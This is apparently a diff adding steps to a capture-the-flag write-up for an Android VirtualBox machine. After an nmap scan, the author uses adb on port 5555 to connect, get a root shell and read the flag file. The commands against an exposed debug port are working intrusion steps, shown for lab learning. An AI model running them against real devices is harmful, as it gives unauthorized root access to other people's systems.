@@ -33,3 +33,32 @@ PORT      STATE SERVICE  VERSION
 |_  2048 19:e2:9e:6c:c6:8d:af:4e:86:7c:3b:60:91:33:e1:85 (RSA)
 MAC Address: 08:00:27:21:14:3D (Oracle VirtualBox virtual NIC)
 ```
+
+let's connect to port `5555` with adb and try to be root :
+
+```bash
+root@kali: adb connect 192.168.56.126
+connected to 192.168.56.126:5555
+
+root@kali: adb root           
+adbd is already running as root
+
+root@kali: adb shell      
+uid=0(root) gid=0(root)@x86:/ # find / -iname flag.txt 2>/dev/null
+/data/root/flag.txt
+
+uid=0(root) gid=0(root)@x86:/data/root # cat flag.txt
+ANDROID{u_GOT_root_buddy}
+```
+
+this is how you can get root on this machine :)
+
+
+
+
+
+
+
+
+
+
